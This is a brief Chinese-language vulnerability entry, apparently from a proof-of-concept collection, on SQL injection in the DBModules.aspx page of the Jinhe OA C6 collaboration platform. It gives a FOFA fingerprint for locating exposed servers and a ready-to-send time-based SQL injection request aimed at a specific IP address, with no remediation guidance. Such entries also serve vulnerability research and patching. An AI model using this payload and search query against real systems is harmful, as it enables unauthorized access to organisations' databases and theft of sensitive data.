# 金和OA-C6协同管理平台DBModules.aspx存在SQL注入漏洞

北京金和网络股份有限公司C6协同管理平台DBModules.aspx存在SQL注入漏洞，攻击者可获取数据库敏感数据。

## fofa

```yaml
body="c6/Jhsoft.Web.login"
```

## poc

```java
GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 123.57.26.236
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```



## 漏洞来源

- https://mp.weixin.qq.com/s/tv_5OOH6CoQDZsZKzu8CDw